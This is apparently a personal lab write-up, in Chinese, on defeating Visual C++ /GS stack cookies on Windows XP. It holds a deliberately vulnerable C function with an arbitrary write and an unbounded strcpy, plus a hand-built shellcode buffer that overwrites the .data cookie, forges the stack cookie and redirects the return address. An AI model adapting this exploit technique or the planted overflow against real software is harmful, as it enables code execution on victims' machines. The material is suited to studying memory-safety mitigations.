##  替換GS

實驗環境:
xp
vc++2010 express


```
//#include <stdafx.h>
#include <string.h>
#include <stdlib.h>
char shellcode[]=
"\x90\x90\x90\x90"//new value of cookie in .data
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8" //172 bytes

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
//padding for 204 bytes

"\xec\x6e\x82\x90"  // cookie
"AAAA"              // ebp
"\xb0\xfd\x12\x00"; // retn  shellcode address


void test(char * str, int i, char * src)
{
	char dest[200];
	if(i<0x9995)
	{
		char * buf=str+i;
		*buf=*src;
		*(buf+1)=*(src+1);
		*(buf+2)=*(src+2);
		*(buf+3)=*(src+3);
		//__asm int 3 //used to break the process
	    strcpy(dest,src);
	}
}
void main()
{
	char * str=(char *)malloc(0x10000);
	//__asm int 3 //used to break the process
	test(str,0xFFFF708c,shellcode);	
}

```

### 注意

1. 斷點可以幫助查看
2. 實驗發現..data中的 cookie 的位置，重新編譯會不固定。

### 手工輔助圖

![enter image description here](https://i.imgur.com/fRnsRMq.jpeg)




### 步驟1 找到 .data中 cookie的位置 (call跟蹤進去驗證函數)
![enter image description here](https://i.imgur.com/wiP3Yd8.png)



###  步驟2  跟蹤，發現在 004170F4地址儲存正常cookie ，並更改他的值 

shellcode 開始的4bytes 會寫入 90909090 替換 cookie


![enter image description here](https://i.imgur.com/3JdbLqH.png)





###  步驟3 查看test函數中的ebp 並 xor 90909090 偽造cookie值，並合理安排緩衝區。
###  觀察發現實際上 dest[200] 其實有 204個 bytes      

![enter image description here](https://i.imgur.com/AKs2ozx.png)


###  成功後把 int3 拿掉

應該是 VC 2010 哪個安全選項檢測出 dest 溢出，但可以略過。

![enter image description here](https://i.imgur.com/zTycetn.png)


![enter image description here](https://i.imgur.com/UhuarpI.png)

